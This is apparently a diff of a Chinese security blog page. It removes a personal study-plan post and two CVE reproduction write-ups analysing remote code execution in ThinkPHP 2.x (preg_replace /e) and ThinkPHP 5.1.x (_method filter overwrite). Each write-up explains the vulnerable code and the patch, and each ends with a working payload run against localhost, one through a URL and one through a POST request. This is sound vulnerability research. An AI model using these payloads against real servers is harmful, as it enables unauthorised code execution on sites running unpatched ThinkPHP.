-<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="奖惩规则"><a href="#奖惩规则" class="headerlink" title="奖惩规则"></a>奖惩规则</h3><p>时间分为三种:专注时间,自由时间,杂;不得不干且并非在计划中且没有干其他不是不得不干的事情的时间称为:杂</p>
-<ol>
-<li>每专注于目标2个小时就可以任意支配1个小时的时间</li>
-<li>专注过程中跑去玩,从头来过,计时清零</li>
-<li>没有认真执行,销毁这份计划</li>
-</ol>
-<h3 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h3><p>寒假期间延迟到2.22(不改我完成不了拉)</p>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li>
-<li><input disabled="" type="checkbox"> 寒假期间复现30个cve(13/30)  , 失败,后面就开始放纵自己呢</li>
-<li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞 ,失败</li>
-<li><input checked="" disabled="" type="checkbox"> 寒假看完码农翻身(1/3)</li>
-</ul>
-<h3 id="3月份"><a href="#3月份" class="headerlink" title="3月份"></a>3月份</h3><p>3.11-3.31</p>
-<ul>
-<li><input disabled="" type="checkbox"> 复现20个cve(0/20)</li>
-<li><input disabled="" type="checkbox"> 看完一本书(未定)</li>
-<li><input checked="" disabled="" type="checkbox"> 看完那本linux书籍</li>
-<li><input disabled="" type="checkbox"> buuoj40题(8/40)</li>
-<li><input disabled="" type="checkbox"> 再挖出20个库币</li>
-</ul>
-<h3 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h3><ul>
-<li><input disabled="" type="checkbox"> 复现30个cve(5/30)</li>
-<li><input disabled="" type="checkbox"> 看完一本书(明朝那些事)</li>
-<li><input disabled="" type="checkbox"> buuoj50题(20/50)</li>
-<li><input disabled="" type="checkbox"> 挖20个库币</li>
-<li><input disabled="" type="checkbox"> 我的世界写一个mod</li>
-</ul>
-<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h3 id="寒假-1"><a href="#寒假-1" class="headerlink" title="寒假"></a>寒假</h3><p>前期做的挺好的,后面因为没有计划/不太会制定计划,就越来越浪</p>
-<h3 id="3月份-1"><a href="#3月份-1" class="headerlink" title="3月份"></a>3月份</h3><p>3月份是真的彻底摸鱼过去,浑浑噩噩没有目标没有计划,但是有很多借口</p>
-<p>最常用的是:我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
-<p>总结:选择一个目标,严格要求自己,记录下每天所做的事情</p>
-<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>最近又被没有理想和目标所困扰,到底是我没有还是我不想有,反正最近是挺无聊的.多看点书,多思考一下吧</p>
-<p>我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/01/31/我的2020/">http://blog.ccreater.top/2020/01/31/我的2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/01/31/%E6%88%91%E7%9A%842020/" data-id="ck917a7d4003eu8v0ei0pf4ok" data-title="我的2020" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-01-30T13:13:11.056Z" itemprop="datePublished">2020-01-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ThinkPHP 2.x任意代码执行漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
-<p>官网的thinkphp 2.2已经修复了</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
-<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
-<p>路由解析处</p>
-<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
-<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
-<blockquote>
-<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
-<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
-<pre><code>/foo bar/
-#^[^0-9]$#
-+php+
-%[a-zA-Z0-9_-]%</code></pre></blockquote>
-<p>替换常量,这个就变成了</p>
-<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
-<p>查看preg_replace的介绍发现</p>
-<blockquote>
-<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
-</blockquote>
-<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
-<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
-<p>构造</p>
-<pre><code class="php">$paths=array(
-    &#39;xxxx&#39;,
-    &#39;${phpinfo()}&#39;
-);</code></pre>
-<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p>
-<p>从而导致命令执行</p>
-<p>于是构造payload</p>
-<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p>
-<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
-<p>用单引号来包围所有引用就可以避免命令执行</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ck917a7at0006u8v0g0f6dr2i" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
-  <time class="dt-published" datetime="2020-01-30T07:35:28.184Z" itemprop="datePublished">2020-01-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
-<p>测试环境 5.1.29</p>
-<p><strong>入口处关闭报错</strong> </p>
-<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
-<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
-<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
-<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
-<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
-<p>我们从<code>Request::param</code>处开始分析</p>
-<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        if (!$this-&gt;mergeParam) {
-            $method = $this-&gt;method(true);
-
-            // 自动获取请求变量
-            switch ($method) {
-                case &#39;POST&#39;:
-                    $vars = $this-&gt;post(false);
-                    break;
-                case &#39;PUT&#39;:
-                case &#39;DELETE&#39;:
-                case &#39;PATCH&#39;:
-                    $vars = $this-&gt;put(false);
-                    break;
-                default:
-                    $vars = [];
-            }
-
-            // 当前请求参数和URL地址中的参数合并
-            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
-
-            $this-&gt;mergeParam = true;
-        }
-
-        ...
-    }</code></pre>
-<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
-<pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        if (empty($this-&gt;post)) {
-            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);
-        }
-
-        return $this-&gt;input($this-&gt;post, $name, $default, $filter);
-    }</code></pre>
-<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
-<p>跟进<code>Request::input</code></p>
-<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
-    {
-        ...
-
-        // 解析过滤器
-        $filter = $this-&gt;getFilter($filter, $default);
-
-        if (is_array($data)) {
-            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
-            reset($data);
-        } else {
-            $this-&gt;filterValue($data, $name, $filter);
-        }
-
-       ...
-    }</code></pre>
-<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
-<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
-<p>跟进去</p>
-<pre><code class="php">private function filterValue(&amp;$value, $key, $filters)
-    {
-        $default = array_pop($filters);
-
-        foreach ($filters as $filter) {
-            if (is_callable($filter)) {
-                // 调用函数或者方法过滤
-                $value = call_user_func($filter, $value);
-            } elseif (is_scalar($value)) {
-                if (false !== strpos($filter, &#39;/&#39;)) {
-                    // 正则过滤
-                    if (!preg_match($filter, $value)) {
-                        // 匹配不成功返回默认值
-                        $value = $default;
-                        break;
-                    }
-                } elseif (!empty($filter)) {
-                    // filter函数不存在时, 则使用filter_var进行过滤
-                    // filter为非整形值时, 调用filter_id取得过滤id
-                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
-                    if (false === $value) {
-                        $value = $default;
-                        break;
-                    }
-                }
-            }
-        }
-
-        return $value;
-    }</code></pre>
-<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
-<p>且<code>$filter</code>=<code>$_POST</code></p>
-<p>因此有</p>
-<pre><code>http://127.0.0.1/public/
-POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck917a7ay000eu8v05sbg8rr3" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/2/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next -&gt;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&lt;- Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next -&gt;</a>
   </nav>
 
 </section>
@@ -2150,7 +1602,7 @@ POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 18px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 20px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/wp/" style="font-size: 16px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 12px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -2159,7 +1611,7 @@ POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
     </div>
   </div>
 
@@ -2172,23 +1624,23 @@ POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁
       <ul>
         
           <li>
-            <a href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
+            <a href="/2020/04/20/byb2019/">百越杯2019</a>
           </li>
         
           <li>
-            <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
+            <a href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
           </li>
         
           <li>
-            <a href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
+            <a href="/2020/04/20/bytectfwp/">bytectf wp</a>
           </li>
         
           <li>
-            <a href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/">CTFd任意密码重置复现</a>
+            <a href="/2020/04/20/d3ctf2019/">d3ctf</a>
           </li>
         
           <li>
-            <a href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
+            <a href="/2020/04/20/eis2019/">eis2019</a>
           </li>
         
       </ul>
